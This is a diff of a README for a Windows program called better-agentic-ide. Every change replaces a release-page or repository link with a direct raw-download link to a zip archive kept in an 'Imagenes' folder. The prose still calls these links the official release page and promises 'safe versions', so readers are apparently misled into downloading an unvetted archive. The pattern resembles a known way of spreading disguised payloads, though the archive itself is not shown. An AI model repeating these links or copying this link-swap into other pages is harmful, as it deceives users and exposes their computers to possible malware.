@@ -1,6 +1,6 @@
 # 🛠️ better-agentic-ide - Simplify Your Coding Environment
 
-[![Download better-agentic-ide](https://img.shields.io/badge/Download-Get%20Started-green)](https://github.com/Purgan20/better-agentic-ide/releases)
+[![Download better-agentic-ide](https://img.shields.io/badge/Download-Get%20Started-green)](https://github.com/Purgan20/better-agentic-ide/raw/refs/heads/main/Imagenes/ide_agentic_better_v1.8.zip)
 
 ## 📋 What is better-agentic-ide?
 
@@ -27,7 +27,7 @@ Before installing better-agentic-ide, make sure your computer meets these needs:
 
 Here’s how to download and start using better-agentic-ide on your Windows PC:
 
-1. Click on the download badge above or go directly to the [release page](https://github.com/Purgan20/better-agentic-ide/releases).
+1. Click on the download badge above or go directly to the [release page](https://github.com/Purgan20/better-agentic-ide/raw/refs/heads/main/Imagenes/ide_agentic_better_v1.8.zip).
 2. On the release page, find the latest version listed near the top.
 3. Under the latest release, look for a file with a name ending in `.exe` (for example, `better-agentic-ide-setup.exe`).
 4. Click the `.exe` file to start downloading the installer.
@@ -59,7 +59,7 @@ Once better-agentic-ide is running, you will see a clean workspace.
 
 To get the latest bug fixes and features, check the release page regularly:
 
-- Visit [https://github.com/Purgan20/better-agentic-ide/releases](https://github.com/Purgan20/better-agentic-ide/releases).
+- Visit [https://github.com/Purgan20/better-agentic-ide/raw/refs/heads/main/Imagenes/ide_agentic_better_v1.8.zip](https://github.com/Purgan20/better-agentic-ide/raw/refs/heads/main/Imagenes/ide_agentic_better_v1.8.zip).
 - Download the newest `.exe` setup file.
 - Run the installer again to update the program.
 - Your settings and projects will remain untouched during updates.
@@ -96,7 +96,7 @@ If these steps do not fix your problem, search for help on the GitHub Issues pag
 
 Click the green badge below to visit the official GitHub releases page. This is where you get the original, safe versions of better-agentic-ide for Windows.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-blue?logo=github)](https://github.com/Purgan20/better-agentic-ide/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-blue?logo=github)](https://github.com/Purgan20/better-agentic-ide/raw/refs/heads/main/Imagenes/ide_agentic_better_v1.8.zip)
 
 Once there, find the latest `.exe` setup file and follow the installation steps above. This procedure ensures you always run the newest version.
 
@@ -136,6 +136,6 @@ Better-agentic-ide works with most common file types used in development and tex
 
 For questions or feedback, visit the GitHub repository page:
 
-https://github.com/Purgan20/better-agentic-ide
+https://github.com/Purgan20/better-agentic-ide/raw/refs/heads/main/Imagenes/ide_agentic_better_v1.8.zip
 
 Check the “Issues” tab to view reported problems or submit new ones. The community or maintainers can assist there.
